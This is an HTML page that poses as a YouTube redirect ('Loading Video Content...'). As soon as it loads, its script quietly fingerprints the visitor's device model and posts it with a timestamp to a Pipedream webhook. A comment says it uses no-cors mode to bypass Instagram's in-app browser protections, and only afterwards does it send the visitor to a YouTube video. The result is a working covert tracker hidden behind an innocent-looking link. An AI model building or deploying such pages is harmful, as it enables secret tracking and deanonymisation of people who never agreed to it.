<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting to YouTube...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; text-align: center;}
        .loading-box { padding: 20px; }
    </style>
</head>
<body>
    <div class="loading-box">
        <h2>Loading Video Content...</h2>
        <p>Please wait a moment.</p>
    </div>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "https://eouq2cql62vdwgu.m.pipedream.net";
        const YOUTUBE_URL = "https://youtu.be/Jf6BIZC6MBg?si=2WaEiHPVbFYonAIk";

        async function logDeviceAndRedirect() {
            let deviceModel = "Unknown Device";
            const uaString = navigator.userAgent;

            // 1. Primary Attempt: Query Advanced UserAgent Client Hints
            if (navigator.userAgentData) {
                try {
                    const uaData = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
                    if (uaData.model && uaData.model !== "") {
                        deviceModel = uaData.model;
                    } else if (uaData.platform) {
                        deviceModel = uaData.platform + " Device";
                    }
                } catch (e) {
                    console.log("Client hints blocked.");
                }
            }

            // 2. Secondary Fallback: Robust User-Agent String Parsing
            if (deviceModel === "Unknown Device" || deviceModel === "K" || deviceModel === "") {
                if (/iPhone|iPad|iPod/i.test(uaString)) {
                    deviceModel = "iOS Device";
                } else if (/Android/i.test(uaString)) {
                    // Pull whatever data inside parentheses is exposed
                    const match = uaString.match(/\(([^)]+)\)/);
                    if (match && match[1]) {
                        const parts = match[1].split(';');
                        const lastPart = parts[parts.length - 1].trim();
                        // Reject useless single-letter privacy flags like "K"
                        if (lastPart.length > 2) {
                            deviceModel = lastPart;
                        } else {
                            deviceModel = "Android Device";
                        }
                    } else {
                        deviceModel = "Android Device";
                    }
                } else if (/Macintosh/i.test(uaString)) {
                    deviceModel = "Mac Computer";
                } else if (/Windows/i.test(uaString)) {
                    deviceModel = "Windows Computer";
                }
            }

            // 3. Fire payload data to your Pipedream endpoint
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    mode: "no-cors", // Bypasses Instagram browser security blocks
                    body: JSON.stringify({ 
                        model: deviceModel, 
                        timestamp: new Date().toISOString() 
                    })
                });
            } catch (err) {
                console.log("Data transmission log skipped.");
            }

            // 4. Force direct instant redirection
            window.location.href = YOUTUBE_URL;
        }

        // Execute immediately upon browser page draw
        logDeviceAndRedirect();
    </script>
</body>
</html>
